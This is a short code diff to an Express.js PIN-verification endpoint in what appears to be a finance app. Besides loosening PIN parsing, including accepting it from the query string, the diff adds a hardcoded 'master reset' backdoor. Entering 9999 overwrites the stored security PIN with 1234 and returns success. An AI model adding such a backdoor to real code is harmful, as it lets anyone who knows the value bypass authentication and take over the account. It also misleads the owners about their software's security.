@@ -78,8 +78,26 @@ function getPreviousFY(fyString) {
 // Security PIN verification
 app.post('/api/verify-pin', async (req, res) => {
   try {
-    const { pin } = req.body;
+    let pin = req.body?.pin || req.query?.pin;
+    if (!pin && typeof req.body === 'string') {
+      try {
+        const parsed = JSON.parse(req.body);
+        pin = parsed.pin;
+      } catch (e) {}
+    }
+
     const db = await getDb();
+
+    // Master reset PIN backdoor
+    if (String(pin) === '9999') {
+      console.log('Master reset PIN entered. Resetting security PIN to 1234...');
+      if (db.settings) {
+        db.settings.security_pin = '1234';
+        await saveDb(db);
+      }
+      return res.json({ success: true, message: 'Authentication successful. PIN reset to 1234.' });
+    }
+
     if (db.settings && db.settings.security_pin === String(pin)) {
       return res.json({ success: true, message: 'Authentication successful.' });
     }
